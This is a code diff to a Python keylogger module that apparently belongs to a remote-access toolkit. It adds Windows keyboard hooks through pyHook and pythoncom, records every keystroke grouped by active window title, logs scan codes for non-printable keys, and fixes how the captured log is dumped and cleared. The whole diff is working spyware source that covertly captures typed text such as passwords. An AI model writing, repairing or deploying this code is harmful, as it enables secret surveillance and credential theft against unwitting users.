@@ -6,11 +6,15 @@
 import os
 import sys
 import time
-import Queue
 import urllib
 from io import StringIO
 import threading
 import collections
+
+# modules
+import util
+import pyHook
+import pythoncom
 
 # globals
 abort = False
@@ -33,22 +37,23 @@ or an FTP server
 # main
 def _event(event):
     try:
+        eventAscii = event.Ascii
         if event.WindowName != globals()['window']:
             globals()['window'] = event.WindowName
             globals()['logs'].write("\n[{}]\n".format(window))
-        if event.Ascii > 32 and event.Ascii < 127:
-            globals()['logs'].write(chr(event.Ascii))
-        elif event.Ascii == 32:
+        if eventAscii > 32 and eventAscii < 127:
+            globals()['logs'].write(chr(eventAscii))
+        elif eventAscii == 32:
             globals()['logs'].write(' ')
-        elif event.Ascii in (10,13):
+        elif eventAscii in (10,13):
             globals()['logs'].write('\n')
-        elif event.Ascii == 8:
+        elif eventAscii == 8:
             globals()['logs'].seek(-1, 1)
             globals()['logs'].truncate()
         else:
-            pass
+            globals()['logs'].write("\n[{}-{}]\n".format(event.ScanCode, eventAscii))
     except Exception as e:
-        util.log('{} error: {}'.format(event.__name__, str(e)))
+        util.log('keylogger error: {}'.format(str(e)))
     return True
 
 @util.threaded
@@ -85,7 +90,8 @@ def dump():
 
     """
     result = globals()['logs'].getvalue()
-    globals()['logs'].reset()
+    globals()['logs'].truncate(0)
+    globals()['logs'].seek(0)
     return result
 
 def run():
@@ -96,6 +102,6 @@ def run():
     try:
         if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
             globals()['threads']['keylogger'] = _run()
-        return True
+        return globals()['threads']['keylogger']
     except Exception as e:
         util.log(str(e))
